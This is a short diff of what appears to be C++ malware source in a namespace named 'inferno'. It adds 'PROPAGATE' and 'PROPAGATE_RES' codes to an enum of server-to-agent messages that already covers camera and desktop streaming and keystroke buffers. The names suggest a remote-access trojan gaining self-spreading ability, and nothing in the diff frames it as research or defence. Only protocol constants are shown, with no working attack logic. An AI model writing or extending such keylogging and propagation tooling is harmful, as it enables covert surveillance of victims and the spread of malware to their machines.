@@ -20,7 +20,10 @@ namespace inferno {
         STREAM_FILE = 0x0103,
         STREAM_CAMERA = 0x0104,
         STREAM_DESKTOP = 0x0105,
+        PROPAGATE = 0x0106,   // Server -> Agent: execute propagation
+        PROPAGATE_RES = 0x0107, // Agent -> Server: propagation result
         KEYLOG_DATA = 0x0108, // Agent -> Server: keystroke buffer payload
-    };
+
+};
 
 } // namespace inferno
